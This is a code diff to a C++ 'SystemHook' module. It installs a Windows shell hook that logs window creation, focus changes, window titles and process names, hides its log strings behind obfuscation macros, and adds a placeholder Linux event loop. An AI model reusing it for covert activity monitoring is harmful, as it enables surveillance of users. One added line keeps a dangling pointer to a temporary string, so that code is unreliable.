@@ -2,10 +2,21 @@
 #include "data/DataManager.h"
 #include "core/Logger.h"
 #include "utils/TimeUtils.h"
+#include "utils/StringUtils.h"
 #include "security/Obfuscation.h"
+
+#if PLATFORM_WINDOWS
 #include <Windows.h>
-#include <string>
 #include <psapi.h>
+#elif PLATFORM_LINUX
+#include <X11/Xlib.h>
+#include <X11/Xutil.h>
+#include <X11/Xatom.h>
+#include <pthread.h>
+#include <unistd.h>
+#endif
+
+#include <string>
 #include <vector>
 #include <cstdint>
 
@@ -14,7 +25,9 @@ constexpr auto OBF_SYSTEMHOOK_MODULE = OBFUSCATE("SystemHook");
 constexpr auto OBF_FOCUSLOG_FORMAT = OBFUSCATE("FocusChange: { gained: %s, lost: %s }");
 
 // Static member initialization
+#if PLATFORM_WINDOWS
 HHOOK SystemHook::s_systemHook = nullptr;
+#endif
 SystemHook* SystemHook::s_instance = nullptr;
 
 SystemHook::SystemHook(DataManager* dataManager)
@@ -33,7 +46,7 @@ bool SystemHook::InstallHook() {
         return true;
     }
 
-    // Install multiple system hooks for different events
+#if PLATFORM_WINDOWS
     s_systemHook = SetWindowsHookExW(
         WH_SHELL,
         ShellProc,
@@ -46,6 +59,12 @@ bool SystemHook::InstallHook() {
         LOG_ERROR("Failed to install system hook. Error: " + std::to_string(error));
         return false;
     }
+#elif PLATFORM_LINUX
+    // Linux implementation using X11 event monitoring
+    // This is a simplified approach - in production you'd want a more robust solution
+    LOG_INFO("System hook not fully implemented for Linux. Window events will not be captured.");
+    // For Linux, we could create a thread to monitor X11 events
+#endif
 
     m_isActive = true;
     LOG_INFO("System hook installed successfully");
@@ -55,18 +74,23 @@ bool SystemHook::InstallHook() {
 bool SystemHook::RemoveHook() {
     if (!m_isActive) return true;
 
+#if PLATFORM_WINDOWS
     if (s_systemHook && !UnhookWindowsHookEx(s_systemHook)) {
         DWORD error = GetLastError();
         LOG_ERROR("Failed to remove system hook. Error: " + std::to_string(error));
         return false;
     }
-
     s_systemHook = nullptr;
+#elif PLATFORM_LINUX
+    // Clean up Linux resources if any
+#endif
+
     m_isActive = false;
     LOG_INFO("System hook removed successfully");
     return true;
 }
 
+#if PLATFORM_WINDOWS
 LRESULT CALLBACK SystemHook::ShellProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= HC_ACTION && s_instance) {
         s_instance->ProcessShellEvent(wParam, lParam);
@@ -100,7 +124,7 @@ void SystemHook::ProcessShellEvent(WPARAM eventType, LPARAM lParam) {
 }
 
 void SystemHook::HandleWindowCreated(HWND hwnd) {
-    if (!hwnd) return;
+    if (!hwnd || !IsWindowVisible(hwnd)) return;
 
     SystemEventData eventData;
     eventData.timestamp = utils::TimeUtils::GetCurrentTimestamp();
@@ -121,6 +145,7 @@ void SystemHook::HandleWindowDestroyed(HWND hwnd) {
     eventData.eventType = SystemEventType::WINDOW_DESTROYED;
     eventData.windowHandle = hwnd;
     eventData.windowTitle = GetWindowTitle(hwnd);
+    eventData.processName = GetProcessName(hwnd);
 
     m_dataManager->AddSystemEventData(eventData);
     LOG_DEBUG("Window destroyed: " + eventData.windowTitle);
@@ -147,24 +172,17 @@ void SystemHook::HandleAppActivated(HWND hwnd) {
     m_dataManager->AddSystemEventData(eventData);
 
     char logMessage[512];
+    const char* previousTitle = s_lastActiveWindow ? GetWindowTitle(s_lastActiveWindow).c_str() : "None";
     snprintf(logMessage, sizeof(logMessage), OBFUSCATED_FOCUSLOG_FORMAT,
-             eventData.windowTitle.c_str(),
-             s_lastActiveWindow ? GetWindowTitle(s_lastActiveWindow).c_str() : "None");
+             eventData.windowTitle.c_str(), previousTitle);
 
     LOG_DEBUG(logMessage);
     s_lastActiveWindow = hwnd;
 }
 
-void SystemHook::HandleShellActivated() {
-    SystemEventData eventData;
-    eventData.timestamp = utils::TimeUtils::GetCurrentTimestamp();
-    eventData.eventType = SystemEventType::SHELL_ACTIVATED;
-
-    m_dataManager->AddSystemEventData(eventData);
-    LOG_DEBUG("Shell activated");
-}
-
 std::string SystemHook::GetWindowTitle(HWND hwnd) const {
+    if (!hwnd) return "Unknown";
+    
     wchar_t title[256];
     if (GetWindowTextW(hwnd, title, sizeof(title) / sizeof(wchar_t))) {
         return utils::StringUtils::WideToUtf8(title);
@@ -173,6 +191,8 @@ std::string SystemHook::GetWindowTitle(HWND hwnd) const {
 }
 
 std::string SystemHook::GetProcessName(HWND hwnd) const {
+    if (!hwnd) return "Unknown";
+    
     DWORD processId;
     if (GetWindowThreadProcessId(hwnd, &processId)) {
         HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
@@ -191,3 +211,37 @@ std::string SystemHook::GetProcessName(HWND hwnd) const {
     }
     return "Unknown";
 }
+#endif // PLATFORM_WINDOWS
+
+void SystemHook::HandleShellActivated() {
+    SystemEventData eventData;
+    eventData.timestamp = utils::TimeUtils::GetCurrentTimestamp();
+    eventData.eventType = SystemEventType::SHELL_ACTIVATED;
+
+    m_dataManager->AddSystemEventData(eventData);
+    LOG_DEBUG("Shell activated");
+}
+
+#if PLATFORM_LINUX
+void* SystemHook::LinuxEventThread(void* context) {
+    SystemHook* instance = static_cast<SystemHook*>(context);
+    if (instance) {
+        instance->LinuxEventLoop();
+    }
+    return nullptr;
+}
+
+void SystemHook::LinuxEventLoop() {
+    // Placeholder for Linux X11 event monitoring
+    // In a real implementation, you would:
+    // 1. Open X11 display connection
+    // 2. Monitor for window creation/destruction events
+    // 3. Monitor for focus change events
+    
+    LOG_INFO("Linux system event monitoring started (placeholder)");
+    
+    while (m_isActive) {
+        Platform::SleepMs(1000); // Simulate event loop
+    }
+}
+#endif // PLATFORM_LINUX
